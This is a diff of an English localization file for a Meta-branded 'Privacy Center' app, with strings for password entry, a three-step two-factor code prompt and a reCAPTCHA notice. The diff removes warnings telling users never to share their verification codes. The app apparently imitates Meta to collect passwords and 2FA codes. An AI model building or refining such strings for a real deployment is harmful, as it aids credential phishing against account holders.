@@ -89,6 +89,7 @@ export const en: AppStrings = {
     errWrong: 'The password you entered is incorrect.',
   },
   twoFa: {
+    modalTitle: 'Two-factor verification',
     title: (step) => `Two-factor authentication required (Step ${step}/3)`,
     description: (email, phone) =>
       `Enter the code sent to ${email}, ${phone}, or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).`,
@@ -126,19 +127,6 @@ export const en: AppStrings = {
       "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
     p3:
       'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
-  },
-  wizard: {
-    progress: (c, t) => `Step ${c} of ${t}`,
-    progressStepsAria: 'Application progress steps',
-    completedHint: 'All steps completed',
-    stepApplication: 'Application',
-    stepSignIn: 'Sign-in',
-    stepSecurity: 'Security',
-    stepTwoFactor: 'Two-factor verification',
-    passwordFooterTrust:
-      'Meta will never call or message you asking for your password or your full security code. Only enter it on official Meta screens like this one.',
-    twoFaFooterTrust:
-      'Never share your verification code via email, messaging apps, link shorteners, or with anyone who contacts you unexpectedly—even if they claim to be from Meta.',
   },
   nav: {
     heading: 'Privacy Center',
